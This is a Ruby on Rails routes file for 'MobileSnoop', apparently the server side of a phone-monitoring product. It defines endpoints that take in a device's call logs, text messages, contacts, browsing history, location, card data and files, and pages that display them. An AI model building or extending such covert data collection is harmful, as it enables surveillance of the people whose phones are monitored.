MobileSnoop::Application.routes.draw do
   
  #  devise_for :users
  #  resources :registrations
  
  devise_for :users,
    :controllers => {
    :registrations => "registrations",
    #    :sessions => "sessions",
    #      :passwords => "passwords",
    #      :confirmations => "confirmations"
  }
  #  get 'registrations/new' => 'registrations#new', :as => :registrations_new
  # The priority is based upon order of creation: first created -> highest priority.
  # See how all your routes lay out with "rake routes".

  # You can have the root of your site routed with "root"
  
  #  root 'users#index'
  root 'home#index'

  resources :home

  resources :mobdevise do
    match 'call_log' => "mobdata#create_call_log", :as => :create_call_log , :via => :post
    match 'browser' => "mobdata#create_browser", :as => :create_browser, :via => :post
    match 'contact' => "mobdata#create_contact", :as => :create_contact, :via => :post
    match 'card'    => "mobdata#create_card",    :as => :create_card,    :via => :post
    match 'location'=> "mobdata#create_loc",     :as => :create_loc,     :via => :post
    match 'text_messages'=> "mobdata#create_text_messages",     :as => :create_text_messages,     :via => :post
    match 'batterystatus' => "mobdata#create_battery", :as => :create_battery, :via => :post
    match 'networkstate' => "mobdata#create_networkstate", :as => :create_networkstate, :via => :post

    match 'upload_file' => "mobdata#create_upload_file", :as => :create_upload_file , :via => :post
    match 'upload_location_file' => "mobdata#create_upload_location_file", :as => :create_upload_location_file, :via => :post
  end
  match 'contact-details/:contact_id' => "mobdata#create_contact_detail", :as => :create_contact_detail, :via => :post
  match 'upload-photo/:contact_id'    => "mobdata#upload",                :as => :upload_contact_photo,  :via => :post
  #match 'upload-card-file'            => "mobdata#upload_file",           :as => :upload_card_file,      :via => :post
  
  get 'users/' => "users#index", :as => :users
  get 'contacts/' => "users#contacts", :as => :contacts
  get 'messages/:type' => "users#messages", :as => :messages
  get 'Browsing' => "users#browsing_history", :as => :browsing_history
  get 'terms-conditions' => "users#terms_conditions", :as => :terms_conditions
  get 'locations' => "users#get_locations", :as => :get_locations
  get 'download-view' => "users#download_view", :as => :download_view
  get 'download' => "users#download_app", :as => :download_app
  get 'download_gallery/:id' => "users#download_gallery",:as=>:download_gallery
  get 'privileged/:id' => "admin#set_privileged", :as => :set_privileged
  get 'gallery/:type' => "users#gallery", :as => :gallery
  get 'Callog-Details' => "users#callog_details",:as=>:callog_details
  
   
   
  
  #  match 'contact_details/:id' => "users#contact_details", :as => :contact_details, :via => :get
  #  match 'device-photos/:device_id' => "users#device_photos", :as => :device_photos, :via => :get
  #match 'locations/:device_id' => "users#get_locations", :as => :get_locations, :via => :get
 
  
  get 'About-Us/' => "home#about", :as => :home_about
  get 'Blog/' => "home#blog", :as => :home_blog
  get 'Contact-Us/' => "home#contact", :as => :home_contact
  get 'Product/' => "home#product", :as => :home_product
  get 'Mobile-Edition/' => "home#mobile_edition", :as => :home_mobile_edition
  get 'Pc_Edition/' => "home#pc_edition", :as => :home_pc_edition
  get 'Privacy-Policy/' => "home#privacy_policy", :as => :home_privacy_policy
  get 'Single-Page/' => "home#single_page", :as => :home_single_page
  get 'Terms-Condition/' => "home#terms_condition", :as => :home_terms_condition
  get 'single-page1/' => "home#single_page1", :as => :home_single_page1
  
  
  
  
  
  get 'admin/index'
  match 'admin/send_mail/:id' => "admin#send_mail", :as => :admin, :via => :get
  match 'admin/icon_download/:id' => "admin#icon_download", :as => :admin_icon_download, :via => :get
  get 'admin/contact_us/:type' => "admin#contact_us", :as => :admin_contact_us
  get 'admin/active/:id' => "admin#active", :as => :admin_active
  post 'admin/upload' => "admin#upload", :as => :admin_upload
  
  
  # Example of regular route:
  #   get 'products/:id' => 'catalog#view'

  # Example of named route that can be invoked with purchase_url(id: product.id)
  #   get 'products/:id/purchase' => 'catalog#purchase', as: :purchase

  # Example resource route (maps HTTP verbs to controller actions automatically):
  #   resources :products

  # Example resource route with options:
  #   resources :products do
  #     member do
  #       get 'short'
  #       post 'toggle'
  #     end
  #
  #     collection do
  #       get 'sold'
  #     end
  #   end

  # Example resource route with sub-resources:
  #   resources :products do
  #     resources :comments, :sales
  #     resource :seller
  #   end

  # Example resource route with more complex sub-resources:
  #   resources :products do
  #     resources :comments
  #     resources :sales do
  #       get 'recent', on: :collection
  #     end
  #   end

  # Example resource route with concerns:
  #   concern :toggleable do
  #     post 'toggle'
  #   end
  #   resources :posts, concerns: :toggleable
  #   resources :photos, concerns: :toggleable

  # Example resource route within a namespace:
  #   namespace :admin do
  #     # Directs /admin/products/* to Admin::ProductsController
  #     # (app/controllers/admin/products_controller.rb)
  #     resources :products
  #   end
end
